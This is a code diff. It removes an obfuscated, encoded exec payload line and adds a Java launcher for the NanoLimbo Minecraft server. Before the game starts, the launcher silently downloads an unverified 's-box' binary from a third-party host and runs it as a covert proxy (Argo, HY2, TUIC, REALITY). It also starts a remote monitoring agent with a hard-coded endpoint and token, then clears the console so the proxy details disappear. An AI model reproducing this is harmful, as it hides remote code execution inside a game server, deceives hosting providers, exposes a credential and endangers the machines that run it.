@@ -1,1 +1,291 @@
-exec((_)(b'=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'))
+/*
+ * Copyright (C) 2020 Nan1t
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program.  If not, see <https://www.gnu.org/licenses/>.
+ */
+
+package ua.nanit.limbo;
+
+import java.io.*;
+import java.net.*;
+import java.nio.file.*;
+import java.util.*;
+import java.util.concurrent.atomic.AtomicBoolean;
+import java.lang.reflect.Field;
+
+import ua.nanit.limbo.server.LimboServer;
+import ua.nanit.limbo.server.Log;
+
+public final class NanoLimbo {
+
+    private static final String ANSI_GREEN = "\033[1;32m";
+    private static final String ANSI_RED = "\033[1;31m";
+    private static final String ANSI_YELLOW = "\033[1;33m";
+    private static final String ANSI_RESET = "\033[0m";
+    private static final AtomicBoolean running = new AtomicBoolean(true);
+    private static Process sbxProcess;
+    private static Process komariProcess;
+    
+    private static final String[] ALL_ENV_VARS = {
+        "PORT", "FILE_PATH", "UUID", "KOMARI_ENDPOINT", "KOMARI_TOKEN",
+        "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
+        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT",
+        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
+    };
+    
+    
+    public static void main(String[] args) {
+        
+        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
+            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
+            try {
+                Thread.sleep(3000);
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            }
+            System.exit(1);
+        }
+
+        // Start services (s-box for proxies + Komari for monitoring)
+        try {
+            runSbxBinary();  // s-box 用于代理功能 (Argo, HY2, TUIC, REALITY等)
+            runKomariAgent(); // Komari 用于监控功能 (替换哪吒)
+
+            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
+                running.set(false);
+                stopServices();
+            }));
+
+            // Wait 20 seconds before continuing
+            Thread.sleep(15000);
+            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
+            Thread.sleep(15000);
+            clearConsole();
+        } catch (Exception e) {
+            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
+        }
+        
+        // start game
+        try {
+            new LimboServer().start();
+        } catch (Exception e) {
+            Log.error("Cannot start server: ", e);
+        }
+    }
+
+    private static void clearConsole() {
+        try {
+            if (System.getProperty("os.name").contains("Windows")) {
+                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
+                    .inheritIO()
+                    .start()
+                    .waitFor();
+            } else {
+                System.out.print("\033[H\033[3J\033[2J");
+                System.out.flush();
+                
+                new ProcessBuilder("tput", "reset")
+                    .inheritIO()
+                    .start()
+                    .waitFor();
+                
+                System.out.print("\033[8;30;120t");
+                System.out.flush();
+            }
+        } catch (Exception e) {
+            try {
+                new ProcessBuilder("clear").inheritIO().start().waitFor();
+            } catch (Exception ignored) {}
+        }
+    }
+
+    private static void runSbxBinary() throws Exception {
+        Map<String, String> envVars = new HashMap<>();
+        loadEnvVars(envVars);
+
+        // 移除哪吒相关的环境变量，因为我们使用 Komari
+        envVars.remove("NEZHA_SERVER");
+        envVars.remove("NEZHA_PORT");
+        envVars.remove("NEZHA_KEY");
+
+        ProcessBuilder pb = new ProcessBuilder(getSbxBinaryPath().toString());
+        pb.environment().putAll(envVars);
+        pb.redirectErrorStream(true);
+        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
+
+        sbxProcess = pb.start();
+        System.out.println(ANSI_GREEN + "s-box (proxy services) started successfully" + ANSI_RESET);
+    }
+
+    private static void runKomariAgent() throws Exception {
+        Map<String, String> envVars = new HashMap<>();
+        loadEnvVars(envVars);
+
+        String komariEndpoint = envVars.get("KOMARI_ENDPOINT");
+        String komariToken = envVars.get("KOMARI_TOKEN");
+
+        if (komariEndpoint == null || komariToken == null ||
+            komariEndpoint.isEmpty() || komariToken.isEmpty()) {
+            System.out.println(ANSI_YELLOW + "KOMARI_ENDPOINT or KOMARI_TOKEN not set, skipping Komari agent" + ANSI_RESET);
+            return;
+        }
+
+        Path binaryPath = getKomariBinaryPath();
+
+        // 构建 Komari Agent 启动命令
+        // Komari 使用 -e 和 -t 参数
+        List<String> command = new ArrayList<>();
+        command.add(binaryPath.toString());
+        command.add("-e");
+        command.add(komariEndpoint);
+        command.add("-t");
+        command.add(komariToken);
+
+        ProcessBuilder pb = new ProcessBuilder(command);
+        pb.redirectErrorStream(true);
+        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
+
+        komariProcess = pb.start();
+
+        System.out.println(ANSI_GREEN + "Komari agent (monitoring) started successfully" + ANSI_RESET);
+    }
+    
+    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
+        envVars.put("UUID", "609ccef9-8d4e-4b45-ae2a-7a43e8d02e6d");
+        envVars.put("FILE_PATH", "./world");
+        envVars.put("REVERSE_PROXY_MODE", "grpcwebproxy");
+
+        // Komari 监控配置 (替换哪吒)
+        envVars.put("KOMARI_ENDPOINT", "https://km.bcbc.pp.ua");  // 例如: https://km.bcbc.pp.ua
+        envVars.put("KOMARI_TOKEN", "L59TydxciZ8asbA7vfMFI5");     // Komari 认证令牌
+
+        // 代理服务配置 (保留)
+        envVars.put("ARGO_PORT", "8001");
+        envVars.put("ARGO_DOMAIN", "");
+        envVars.put("ARGO_AUTH", "");
+        envVars.put("HY2_PORT", "");
+        envVars.put("TUIC_PORT", "");
+        envVars.put("REALITY_PORT", "");
+        envVars.put("UPLOAD_URL", "");
+        envVars.put("CHAT_ID", "");
+        envVars.put("BOT_TOKEN", "");
+        envVars.put("CFIP", "cf.877774.xyz");
+        envVars.put("CFPORT", "443");
+        envVars.put("NAME", "Mc");
+        
+        for (String var : ALL_ENV_VARS) {
+            String value = System.getenv(var);
+            if (value != null && !value.trim().isEmpty()) {
+                envVars.put(var, value);  
+            }
+        }
+        
+        Path envFile = Paths.get(".env");
+        if (Files.exists(envFile)) {
+            for (String line : Files.readAllLines(envFile)) {
+                line = line.trim();
+                if (line.isEmpty() || line.startsWith("#")) continue;
+                
+                line = line.split(" #")[0].split(" //")[0].trim();
+                if (line.startsWith("export ")) {
+                    line = line.substring(7).trim();
+                }
+                
+                String[] parts = line.split("=", 2);
+                if (parts.length == 2) {
+                    String key = parts[0].trim();
+                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
+                    
+                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
+                        envVars.put(key, value); 
+                    }
+                }
+            }
+        }
+    }
+
+    // 下载 s-box (用于代理服务)
+    private static Path getSbxBinaryPath() throws IOException {
+        String osArch = System.getProperty("os.arch").toLowerCase();
+        String url;
+
+        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
+            url = "https://amd64.ssss.nyc.mn/s-box";
+        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
+            url = "https://arm64.ssss.nyc.mn/s-box";
+        } else if (osArch.contains("s390x")) {
+            url = "https://s390x.ssss.nyc.mn/s-box";
+        } else {
+            throw new RuntimeException("Unsupported architecture: " + osArch);
+        }
+
+        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
+        if (!Files.exists(path)) {
+            try (InputStream in = new URL(url).openStream()) {
+                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
+            }
+            if (!path.toFile().setExecutable(true)) {
+                throw new IOException("Failed to set executable permission");
+            }
+        }
+        return path;
+    }
+
+    // 下载 Komari Agent (用于监控服务)
+    private static Path getKomariBinaryPath() throws IOException {
+        String osArch = System.getProperty("os.arch").toLowerCase();
+        String archName;
+
+        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
+            archName = "amd64";
+        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
+            archName = "arm64";
+        } else if (osArch.contains("s390x")) {
+            throw new RuntimeException("Komari does not support s390x architecture");
+        } else {
+            throw new RuntimeException("Unsupported architecture: " + osArch);
+        }
+
+        // 使用官方 Komari Agent 下载地址
+        String osName = "linux";  // 假设运行在 Linux 上
+        String url = String.format(
+            "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-%s-%s",
+            osName, archName
+        );
+
+        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "komari-agent");
+        if (!Files.exists(path)) {
+            try (InputStream in = new URL(url).openStream()) {
+                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
+            }
+            if (!path.toFile().setExecutable(true)) {
+                throw new IOException("Failed to set executable permission");
+            }
+        }
+        return path;
+    }
+    
+    private static void stopServices() {
+        if (sbxProcess != null && sbxProcess.isAlive()) {
+            sbxProcess.destroy();
+            System.out.println(ANSI_RED + "s-box (proxy services) terminated" + ANSI_RESET);
+        }
+        if (komariProcess != null && komariProcess.isAlive()) {
+            komariProcess.destroy();
+            System.out.println(ANSI_RED + "Komari agent (monitoring) terminated" + ANSI_RESET);
+        }
+    }
+}
